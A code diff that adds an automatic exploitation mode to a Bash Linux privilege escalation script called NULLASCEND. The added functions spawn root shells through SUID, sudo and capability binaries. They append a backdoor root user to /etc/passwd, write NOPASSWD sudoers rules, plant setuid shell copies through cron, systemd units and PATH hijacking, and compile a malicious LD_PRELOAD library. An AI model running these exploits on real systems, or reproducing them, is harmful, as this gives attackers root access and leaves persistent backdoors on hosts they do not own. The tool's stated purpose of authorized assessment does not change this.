@@ -2,11 +2,11 @@
 
 
 ################################################################################
-# NULLASEND - Linux Privilege Escalation Enumeration Script
+# NULLASCEND - Linux Privilege Escalation Enumeration Script
 # 
 # Purpose: Rapid, low-noise enumeration of core privilege escalation vectors
 # WARNING: For authorized security assessments only. Unauthorized use is illegal.
-# Usage: ./enum.sh [-o output.txt] [-q] [-v]
+# Usage: ./enum.sh [-o output.txt] [-q] [-v] [--auto]
 ################################################################################
 
 set -o pipefail
@@ -21,12 +21,15 @@ readonly NC='\033[0m'
 QUIET_MODE=false
 VERBOSE_MODE=false
 OUTPUT_FILE=""
+AUTO_EXPLOIT=false
 
 declare -i COUNT_CRITICAL=0
 declare -i COUNT_HIGH=0
 declare -i COUNT_MEDIUM=0
 declare -i COUNT_LOW=0
 declare -i COUNT_INFO=0
+
+declare -a EXPLOIT_QUEUE=()
 
 
 print_header() {
@@ -62,8 +65,19 @@ print_hint() {
     echo -e "  ${CYAN}→ $hint${NC}"
 }
 
+print_exploit() {
+    local message=$1
+    echo -e "${GREEN}[EXPLOIT]${NC} $message"
+}
+
 check_cmd() {
     command -v "$1" >/dev/null 2>&1
+}
+
+queue_exploit() {
+    local exploit_type=$1
+    local exploit_data=$2
+    EXPLOIT_QUEUE+=("$exploit_type|$exploit_data")
 }
 
 grep_credentials() {
@@ -159,6 +173,10 @@ enum_suid() {
                     print_finding "HIGH" "SUID: $file"
                     print_gtfo "$target"
                     ((interesting_found++))
+                    
+                    if $AUTO_EXPLOIT; then
+                        queue_exploit "suid" "$file|$base"
+                    fi
                     break
                 fi
             done
@@ -211,11 +229,13 @@ enum_sudo() {
         return
     fi
     
-    local sudo_out=$(sudo -n -l 2>&1)
+    local sudo_out
+    sudo_out=$(sudo -n -l 2>&1 || true)
+
     
     if echo "$sudo_out" | grep -qi "may not run sudo"; then
         echo "User has no sudo access"
-        return
+        return  
     fi
     
     if echo "$sudo_out" | grep -qi "password is required"; then
@@ -228,6 +248,10 @@ enum_sudo() {
     
     if echo "$sudo_out" | grep -qE '\(ALL.*ALL\).*ALL|NOPASSWD.*ALL'; then
         print_finding "CRITICAL" "Unrestricted sudo access (ALL) detected"
+        
+        if $AUTO_EXPLOIT; then
+            queue_exploit "sudo_all" "ALL"
+        fi
     fi
     
     if echo "$sudo_out" | grep -q "NOPASSWD"; then
@@ -241,6 +265,10 @@ enum_sudo() {
         if echo "$sudo_out" | grep -qE "\\b$cmd\\b"; then
             print_finding "HIGH" "Can sudo $cmd"
             print_gtfo "$cmd"
+            
+            if $AUTO_EXPLOIT && echo "$sudo_out" | grep -q "NOPASSWD"; then
+                queue_exploit "sudo_cmd" "$cmd"
+            fi
         fi
     done
     
@@ -267,6 +295,10 @@ enum_sudo() {
             
             if $is_vulnerable; then
                 print_finding "HIGH" "Sudo version vulnerable to CVE-2021-3156 (Baron Samedit)"
+                
+                if $AUTO_EXPLOIT; then
+                    queue_exploit "sudo_cve" "CVE-2021-3156"
+                fi
             fi
         fi
     fi
@@ -292,6 +324,10 @@ enum_cron() {
         
         if [[ -w /etc/crontab ]]; then
             print_finding "CRITICAL" "/etc/crontab is writable"
+            
+            if $AUTO_EXPLOIT; then
+                queue_exploit "writable_cron" "/etc/crontab"
+            fi
         fi
         ((found++))
     fi
@@ -303,6 +339,10 @@ enum_cron() {
         
         if [[ -w "$dir" ]]; then
             print_finding "HIGH" "Writable cron directory: $dir"
+            
+            if $AUTO_EXPLOIT; then
+                queue_exploit "writable_cron_dir" "$dir"
+            fi
             ((found++))
         fi
         
@@ -311,6 +351,10 @@ enum_cron() {
             
             if [[ -w "$file" ]]; then
                 print_finding "HIGH" "Writable cron file: $file"
+                
+                if $AUTO_EXPLOIT; then
+                    queue_exploit "writable_cron_file" "$file"
+                fi
                 ((found++))
             fi
         done
@@ -398,6 +442,10 @@ enum_capabilities() {
                 if [[ "$severity" == "HIGH" ]]; then
                     if echo "$caps" | grep -q "cap_setuid"; then
                         echo "  → Can change UID to root"
+                        
+                        if $AUTO_EXPLOIT && $has_gtfo; then
+                            queue_exploit "capability" "$file|$base|cap_setuid"
+                        fi
                     fi
                     if echo "$caps" | grep -q "cap_setgid"; then
                         echo "  → Can change GID for privilege escalation"
@@ -442,6 +490,10 @@ enum_writable() {
         
         if [[ -w "$file" ]]; then
             print_finding "CRITICAL" "Writable: $file"
+            
+            if $AUTO_EXPLOIT; then
+                queue_exploit "writable_file" "$file"
+            fi
             ((found++))
         elif [[ -r "$file" && "$file" == *"shadow"* ]]; then
             print_finding "MEDIUM" "Readable: $file (extract hashes for cracking)"
@@ -452,11 +504,19 @@ enum_writable() {
     if [[ -d /etc/sudoers.d ]]; then
         if [[ -w /etc/sudoers.d ]]; then
             print_finding "CRITICAL" "Writable directory: /etc/sudoers.d/"
+            
+            if $AUTO_EXPLOIT; then
+                queue_exploit "writable_sudoers_d" "/etc/sudoers.d"
+            fi
             ((found++))
         else
             for f in /etc/sudoers.d/*; do
                 if [[ -f "$f" && -w "$f" ]]; then
                     print_finding "CRITICAL" "Writable: $f"
+                    
+                    if $AUTO_EXPLOIT; then
+                        queue_exploit "writable_file" "$f"
+                    fi
                     ((found++))
                 fi
             done
@@ -466,6 +526,10 @@ enum_writable() {
     if [[ -d /etc/systemd/system ]]; then
         while IFS= read -r svc; do
             print_finding "HIGH" "Writable service: $svc"
+            
+            if $AUTO_EXPLOIT; then
+                queue_exploit "writable_service" "$svc"
+            fi
             ((found++))
         done < <(find /etc/systemd/system -maxdepth 2 -name "*.service" -writable 2>/dev/null)
     fi
@@ -487,6 +551,10 @@ enum_path() {
         if [[ -d "$dir" && -w "$dir" ]]; then
             print_finding "HIGH" "Writable PATH directory: $dir"
             echo "  → Place malicious binary to hijack commands"
+            
+            if $AUTO_EXPLOIT; then
+                queue_exploit "writable_path" "$dir"
+            fi
             ((found++))
         fi
     done
@@ -504,6 +572,10 @@ enum_path() {
     if [[ -e /etc/ld.so.preload ]]; then
         if [[ -w /etc/ld.so.preload ]]; then
             print_finding "CRITICAL" "/etc/ld.so.preload is writable"
+            
+            if $AUTO_EXPLOIT; then
+                queue_exploit "writable_ldpreload" "/etc/ld.so.preload"
+            fi
             ((found++))
         elif [[ -r /etc/ld.so.preload ]]; then
             local content=$(cat /etc/ld.so.preload 2>/dev/null)
@@ -608,6 +680,407 @@ enum_credentials() {
 }
 
 
+exploit_suid() {
+    local file=$1
+    local base=$2
+    
+    print_exploit "Attempting SUID exploitation: $base"
+    
+    case $base in
+        bash|sh|dash|ash|zsh)
+            print_exploit "Spawning root shell via $file -p"
+            "$file" -p
+            ;;
+        find)
+            print_exploit "Spawning root shell via find"
+            "$file" . -exec /bin/sh -p \; -quit
+            ;;
+        vim|vi)
+            print_exploit "GTFOBins exploit for $base"
+            echo "Run: $file -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+            ;;
+        python*|perl|ruby|php|node|lua)
+            print_exploit "Spawning root shell via $base"
+            if [[ "$base" == python* ]]; then
+                "$file" -c 'import os; os.setuid(0); os.system("/bin/sh -p")'
+            elif [[ "$base" == "perl" ]]; then
+                "$file" -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+            elif [[ "$base" == "ruby" ]]; then
+                "$file" -e 'Process::Sys.setuid(0); exec "/bin/sh"'
+            elif [[ "$base" == "php" ]]; then
+                "$file" -r 'posix_setuid(0); system("/bin/sh");'
+            elif [[ "$base" == "node" ]]; then
+                "$file" -e 'require("child_process").spawn("/bin/sh", ["-p"], {uid:0, stdio: "inherit"})'
+            fi
+            ;;
+        env)
+            print_exploit "Spawning root shell via env"
+            "$file" /bin/sh -p
+            ;;
+        less|more|man)
+            print_exploit "GTFOBins exploit for $base - Run: $file /etc/profile then !/bin/sh -p"
+            ;;
+        awk)
+            print_exploit "Spawning root shell via awk"
+            "$file" 'BEGIN {system("/bin/sh -p")}'
+            ;;
+        tar)
+            print_exploit "Spawning root shell via tar"
+            "$file" -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+            ;;
+        *)
+            print_exploit "Generic SUID binary found - manual exploitation required"
+            echo "  Binary: $file"
+            echo "  Check GTFOBins: https://gtfobins.github.io/"
+            ;;
+    esac
+}
+
+
+exploit_sudo_all() {
+    print_exploit "Attempting sudo privilege escalation"
+    print_exploit "Spawning root shell via: sudo /bin/bash"
+    sudo /bin/bash
+}
+
+
+exploit_sudo_cmd() {
+    local cmd=$1
+    
+    print_exploit "Attempting sudo command exploitation: $cmd"
+    
+    case $cmd in
+        vim|vi)
+            print_exploit "Run: sudo $cmd -c ':!/bin/sh'"
+            ;;
+        less|more|man)
+            print_exploit "Run: sudo $cmd /etc/profile then !/bin/sh"
+            ;;
+        find)
+            print_exploit "Spawning root shell"
+            sudo find . -exec /bin/sh \; -quit
+            ;;
+        python*|perl|ruby|php|node|lua)
+            print_exploit "Spawning root shell"
+            if [[ "$cmd" == python* ]]; then
+                sudo "$cmd" -c 'import os; os.system("/bin/sh")'
+            elif [[ "$cmd" == "perl" ]]; then
+                sudo "$cmd" -e 'exec "/bin/sh";'
+            fi
+            ;;
+        env)
+            print_exploit "Spawning root shell"
+            sudo env /bin/sh
+            ;;
+        awk)
+            print_exploit "Spawning root shell"
+            sudo awk 'BEGIN {system("/bin/sh")}'
+            ;;
+        *)
+            print_exploit "Manual exploitation required for: sudo $cmd"
+            echo "  Check: https://gtfobins.github.io/gtfobins/$cmd/"
+            ;;
+    esac
+}
+
+
+exploit_writable_file() {
+    local file=$1
+    
+    print_exploit "Writable sensitive file: $file"
+    
+    case $file in
+        /etc/passwd)
+            print_exploit "Adding root user 'hacker' with password 'hacked'"
+            echo 'hacker:$1$hacker$TF4gGJJVGhKKr4pV.8fAb/:0:0:root:/root:/bin/bash' >> "$file"
+            print_exploit "Login with: su hacker (password: hacked)"
+            ;;
+        /etc/shadow)
+            print_exploit "Shadow file writable - can modify root password hash"
+            echo "  Generate hash: openssl passwd -1 newpassword"
+            ;;
+        /etc/sudoers)
+            print_exploit "Adding ALL privileges to current user"
+            echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> "$file"
+            print_exploit "Run: sudo /bin/bash"
+            ;;
+        *)
+            print_exploit "Writable file: $file - manual exploitation required"
+            ;;
+    esac
+}
+
+
+exploit_writable_sudoers_d() {
+    local dir=$1
+    
+    print_exploit "Creating sudoers rule in: $dir"
+    local rule_file="$dir/99-exploit"
+    echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" > "$rule_file"
+    chmod 0440 "$rule_file"
+    print_exploit "Rule created: $rule_file"
+    print_exploit "Run: sudo /bin/bash"
+}
+
+
+exploit_writable_cron() {
+    local file=$1
+    
+    print_exploit "Injecting reverse shell into cron: $file"
+    echo "* * * * * root cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell" >> "$file"
+    print_exploit "Wait 1 minute then run: /tmp/rootshell -p"
+}
+
+
+exploit_writable_cron_dir() {
+    local dir=$1
+    
+    print_exploit "Creating cron job in: $dir"
+    local cron_file="$dir/exploit"
+    echo '#!/bin/bash' > "$cron_file"
+    echo 'cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell' >> "$cron_file"
+    chmod +x "$cron_file"
+    print_exploit "Cron job created: $cron_file"
+    print_exploit "Wait for execution then run: /tmp/rootshell -p"
+}
+
+
+exploit_writable_cron_file() {
+    exploit_writable_cron "$1"
+}
+
+
+exploit_writable_service() {
+    local service=$1
+    
+    print_exploit "Injecting code into systemd service: $service"
+    
+    if grep -q "^\[Service\]" "$service"; then
+        sed -i '/^\[Service\]/a ExecStartPre=/bin/bash -c "cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell"' "$service"
+        print_exploit "Service modified. Restart service or reboot."
+        print_exploit "Then run: /tmp/rootshell -p"
+    else
+        print_exploit "Service format unknown - manual exploitation required"
+    fi
+}
+
+
+exploit_writable_path() {
+    local dir=$1
+    
+    print_exploit "Creating malicious binary in PATH: $dir"
+    
+    local target_bins=("ls" "ps" "id" "whoami")
+    local chosen=""
+    
+    for bin in "${target_bins[@]}"; do
+        if ! [[ -f "$dir/$bin" ]]; then
+            chosen="$bin"
+            break
+        fi
+    done
+    
+    if [[ -z "$chosen" ]]; then
+        print_exploit "Common binaries already exist - trying 'update'"
+        chosen="update"
+    fi
+    
+    cat > "$dir/$chosen" << 'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootshell
+chmod +s /tmp/rootshell
+EOF
+    
+    chmod +x "$dir/$chosen"
+    print_exploit "Created: $dir/$chosen"
+    print_exploit "Wait for root to run '$chosen' then: /tmp/rootshell -p"
+}
+
+
+exploit_writable_ldpreload() {
+    local file=$1
+    
+    print_exploit "Creating malicious shared library for LD_PRELOAD"
+    
+    local lib_path="/tmp/exploit.so"
+    
+    cat > /tmp/exploit.c << 'EOF'
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setuid(0);
+    setgid(0);
+    system("/bin/bash -p");
+}
+EOF
+    
+    if check_cmd gcc; then
+        gcc -fPIC -shared -nostartfiles -o "$lib_path" /tmp/exploit.c 2>/dev/null
+        echo "$lib_path" > "$file"
+        print_exploit "Library created and registered in $file"
+        print_exploit "Wait for privileged process to load library"
+    else
+        print_exploit "gcc not available - cannot compile exploit library"
+    fi
+}
+
+
+exploit_capability() {
+    local file=$1
+    local base=$2
+    local cap=$3
+    
+    print_exploit "Exploiting capability: $cap on $base"
+    
+    if [[ "$cap" == "cap_setuid" ]]; then
+        case $base in
+            python*)
+                print_exploit "Spawning root shell"
+                "$file" -c 'import os; os.setuid(0); os.system("/bin/sh")'
+                ;;
+            perl)
+                print_exploit "Spawning root shell"
+                "$file" -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+                ;;
+            ruby)
+                print_exploit "Spawning root shell"
+                "$file" -e 'Process::Sys.setuid(0); exec "/bin/sh"'
+                ;;
+            php)
+                print_exploit "Spawning root shell"
+                "$file" -r 'posix_setuid(0); system("/bin/sh");'
+                ;;
+            node)
+                print_exploit "Spawning root shell"
+                "$file" -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: "inherit"})'
+                ;;
+            *)
+                print_exploit "Manual exploitation required"
+                print_gtfo "$base"
+                ;;
+        esac
+    fi
+}
+
+
+exploit_sudo_cve() {
+    local cve=$1
+    
+    print_exploit "Exploiting $cve (Baron Samedit)"
+    print_exploit "This requires external exploit code"
+    echo "  Download: https://github.com/blasty/CVE-2021-3156"
+    echo "  Or search: searchsploit sudo CVE-2021-3156"
+}
+
+
+run_auto_exploit() {
+    if [[ ${#EXPLOIT_QUEUE[@]} -eq 0 ]]; then
+        echo ""
+        print_finding "INFO" "No auto-exploitable vectors found"
+        return
+    fi
+    
+    print_header "Auto-Exploitation"
+    
+    echo "Found ${#EXPLOIT_QUEUE[@]} exploitable vector(s)"
+    echo ""
+    echo -e "${YELLOW}WARNING: Auto-exploitation will attempt to gain root access${NC}"
+    echo -e "${YELLOW}         This may modify system files or create artifacts${NC}"
+    echo ""
+    read -p "Continue with auto-exploitation? [y/N]: " -n 1 -r
+    echo ""
+    
+    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
+        print_finding "INFO" "Auto-exploitation cancelled by user"
+        return
+    fi
+    
+    echo ""
+    
+    for item in "${EXPLOIT_QUEUE[@]}"; do
+        local type=$(echo "$item" | cut -d'|' -f1)
+        local data=$(echo "$item" | cut -d'|' -f2-)
+        
+        echo ""
+        echo -e "${BLUE}───────────────────────────────────────────────────────────────${NC}"
+        
+        case $type in
+            suid)
+                local file=$(echo "$data" | cut -d'|' -f1)
+                local base=$(echo "$data" | cut -d'|' -f2)
+                exploit_suid "$file" "$base"
+                ;;
+            sudo_all)
+                exploit_sudo_all
+                ;;
+            sudo_cmd)
+                exploit_sudo_cmd "$data"
+                ;;
+            writable_file)
+                exploit_writable_file "$data"
+                ;;
+            writable_sudoers_d)
+                exploit_writable_sudoers_d "$data"
+                ;;
+            writable_cron)
+                exploit_writable_cron "$data"
+                ;;
+            writable_cron_dir)
+                exploit_writable_cron_dir "$data"
+                ;;
+            writable_cron_file)
+                exploit_writable_cron_file "$data"
+                ;;
+            writable_service)
+                exploit_writable_service "$data"
+                ;;
+            writable_path)
+                exploit_writable_path "$data"
+                ;;
+            writable_ldpreload)
+                exploit_writable_ldpreload "$data"
+                ;;
+            capability)
+                local file=$(echo "$data" | cut -d'|' -f1)
+                local base=$(echo "$data" | cut -d'|' -f2)
+                local cap=$(echo "$data" | cut -d'|' -f3)
+                exploit_capability "$file" "$base" "$cap"
+                ;;
+            sudo_cve)
+                exploit_sudo_cve "$data"
+                ;;
+        esac
+        
+        if [[ $? -eq 0 ]]; then
+            print_exploit "Exploit completed"
+        else
+            print_exploit "Exploit may have failed - check manually"
+        fi
+        
+        sleep 1
+    done
+    
+    echo ""
+    echo -e "${BLUE}───────────────────────────────────────────────────────────────${NC}"
+    echo ""
+    print_exploit "Auto-exploitation phase complete"
+    
+    if [[ $(id -u) -eq 0 ]]; then
+        echo ""
+        print_exploit "SUCCESS: Root access obtained!"
+        echo "  UID: $(id -u)"
+        echo "  User: $(whoami)"
+    else
+        echo ""
+        print_exploit "Root access not obtained - check individual exploit results"
+        echo "  Some exploits may require waiting for cron jobs or process restarts"
+    fi
+}
+
+
 print_summary() {
     echo ""
     echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
@@ -646,6 +1119,12 @@ print_summary() {
     
     echo ""
     echo "Total actionable findings: $total"
+    
+    if $AUTO_EXPLOIT && [[ ${#EXPLOIT_QUEUE[@]} -gt 0 ]]; then
+        echo ""
+        echo -e "${CYAN}Auto-exploitable vectors: ${#EXPLOIT_QUEUE[@]}${NC}"
+    fi
+    
     echo ""
     
     if [[ $COUNT_CRITICAL -gt 0 ]]; then
@@ -669,11 +1148,13 @@ main() {
             -o) OUTPUT_FILE="$2"; shift 2 ;;
             -q) QUIET_MODE=true; shift ;;
             -v) VERBOSE_MODE=true; shift ;;
+            --auto) AUTO_EXPLOIT=true; shift ;;
             -h|--help)
-                echo "Usage: $0 [-o output.txt] [-q] [-v]"
+                echo "Usage: $0 [-o output.txt] [-q] [-v] [--auto]"
                 echo "  -o FILE    Save output to file"
                 echo "  -q         Quiet mode (findings only)"
                 echo "  -v         Verbose mode (show all SUID binaries)"
+                echo "  --auto     Enable auto-exploitation (requires confirmation)"
                 exit 0
                 ;;
             *) echo "Unknown option: $1"; exit 1 ;;
@@ -701,6 +1182,12 @@ main() {
                                                                      "
     echo "Started: $(date)"
     
+    if $AUTO_EXPLOIT; then
+        echo ""
+        echo -e "${YELLOW}[!] Auto-exploitation mode enabled${NC}"
+        echo -e "${YELLOW}[!] Exploits will be queued and executed after enumeration${NC}"
+    fi
+    
     enum_system
     enum_suid
     enum_sudo
@@ -711,6 +1198,10 @@ main() {
     enum_credentials
     
     print_summary
+    
+    if $AUTO_EXPLOIT; then
+        run_auto_exploit
+    fi
     
     echo ""
     echo "Complete: $(date)"
